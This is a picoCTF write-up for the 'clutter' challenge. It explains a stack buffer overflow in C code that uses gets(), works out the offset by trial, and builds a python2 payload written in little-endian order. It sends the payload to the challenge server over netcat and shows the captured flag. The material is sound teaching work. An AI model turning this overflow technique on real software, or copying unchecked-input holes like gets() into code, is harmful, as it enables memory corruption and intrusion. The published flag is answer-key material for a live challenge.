# Solution

Let's start by looking at the `chall.c` file:

Here's some notable definitions and the `main` function
```c
#define SIZE 0x100
#define GOAL 0xdeadbeef


int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```

In order for our flag to print, we want to have `code == GOAL` be true, because we can see that that's where `system("cat flag.txt")` is executed. Recall that `cat flag.txt` will print the contexts of the file flag.txt.

Ok! How can we get code to equal GOAL, which happens to `0xdeadbeef`. There's no assignments for `code` earlier in the code, but there is one for `clutter`. In the line
`gets(clutter)`.  If you look at the man page for gets (by calling `man gets` in the terminal) you can see that the description says "Never use this function". Why? Because it keeps reading from user input until it finds a new line '\n' or EOF. Which means we can overwrite stuff with the `gets` command.

Looking at the main function, we see that
```c
long code = 0;
char clutter[SIZE];
```
`code` is defined before `clutter`. Recall that local variables are stored on the stack. Because of the ordering of definitions, we are able to overwrite whatever's stored in `code`. (The stack grows down towards lower memory addresses).

Here's a hypothetical stack space (it's not actually like this) just to demonstrate that `clutter` can overwrite `code`.

```
address FFFFFF

address ...
address 802000         code
address 80FFF2         clutter
address ...

address 000000
```
When we write into `clutter` it starts writing at 0x80FFF2, then 0x80FFF3, then 0x80FFF4 etc. Which is why it can overwrite `code`, even though the stack grows down, when we write to it we write in ascending address order.

Ok, we must overwrite `clutter`, how large is it? We see in the code that it's so size `SIZE`, and that `SIZE` of equal to `0x100`, which is 256.

There are two approaches that follow this, we want to find out the stack layout so we know how much to overwrite in order to overwrite `code`, the first approach, trial and error, is made a lot easier because of the code provided. What that is is the fact that they print what's stored in code for us with the line `printf("code == 0x%llx\n", code);`, so we can try overwriting clutter and see if the overwrite into `code` right away, or if there's anything else in the stack inbetween `code` and `clutter`.

Here's what I did on my terminal
```
$ python2 -c "print('A'*256 + 'ABCD')" > out
$ ./chall < out
```
What's happening here? I'm calling `python2 -c`, the -c switch allows me to write python code without jumping into a python shell or anything like that, basically "python2 -c <insert code here>" is what it means, and it'll execute the code provided.

I'm executing a print statement, where I print 256 A's, and then "ABCD".

Then there's the `> out`, what I'm doing is I'm directing whatever the output of my previous command is, and putting it into a file called `out`. Then, I'm executing `chall` and with `< out`, I'm directing whatever's in `chall` into the executable. This is equivalent to my executing `chall`, and then typing in 256 A's and then ABCD. A bit of terminal magic makes it a lot more convenient.

What's outputted?
```
My room is so cluttered...
What do you see?
code == 0x0
code != 0xdeadbeef :(
```
Damn, the code is 0x0, we're not overwriting code yet. Let's try printing 264 A's instead. Why 264? I'm adding 8. Why am I adding 8? Because that's usually the size of an address, so it is a reasonable offset to try.

```
$ python2 -c "print('A'*264 + 'ABCD')" > out
$ ./chall < out
```

What's outputted?
```
My room is so cluttered...
What do you see?
code == 0x44434241
code != 0xdeadbeef :(
```
Ah! We've found the right offset and overwritten `code`. Let's try to understand what's going on. The output says that `code == 0x44434241`. Recall ascii conversions, A is equivalent to 0x41, B is equivalent to 0x42, etc. `code` is basically storing "DCBA", why is it reversed?

Basically, stuff on the stack is stored in "little endian", which is a complicated alternative way to order stuff. Why do they do this? I'm not sure. But read [this](https://www.tutorialspoint.com/big-endian-and-little-endian) if you want to know more. I recommend you read it to get familiar with the formatting.

So instead of writing "ABCD" we want to write `0xdeadbeef`, if we just do 
```
$ python2 -c "print('A'*264 + 'deadbeef')" > out
```
or 
```
$ python2 -c "print('A'*264 + '0xdeadbeef')" > out
```
we won't get what we want, because in these two examples, we're writing the string `0xdeadbeef` or `deadbeef`, we want to write the HEX VALUES `0xdeadbeef`. There's no ascii equivalent for `0xde` or `0xad` so this does make it a little harder. 

But don't worry! Python to the rescue, we can write hex in this format: `\xde\xad\xbe\xef`

```bash
$ python2 -c "print('A'* 264 + '\xde\xad\xbe\xef')" > out
$ ./chall < out
```

If you thought "wait what about little endian?" I'm glad you realized, in the code above, I'm not considering little endian, I'm just showing this for demonstrative purposes. What would the output be in this case?

```
My room is so cluttered...
What do you see?
code == 0xefbeadde
code != 0xdeadbeef :(
```

If we change the order of our input so that it's in little endian:

```bash
$ python2 -c "print('A'* 264 + '\xef\xbe\xad\xde')" > out
```
and then instead of directing it into the `chall` executable, we direct it into the netcat server:
```
$ nc mars.picoctf.net 31890 < out
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

```
We got this flag! Well done.